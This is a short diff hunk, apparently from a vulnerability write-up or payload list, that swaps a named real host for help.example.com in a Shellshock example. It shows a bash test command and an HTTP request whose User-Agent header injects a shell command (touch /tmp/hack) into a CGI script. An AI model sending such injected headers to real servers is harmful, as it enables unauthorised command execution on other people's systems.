@@ -7,7 +7,7 @@ env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
 Exploit:
 ```http
 GET /cgi-bin/test.cgi HTTP/1.1 
-Host: help.tenpay.com 
+Host: help.example.com 
 User-Agent: () { :;}; touch /tmp/hack
 Accept: */*
 Referer: http://www.example.com
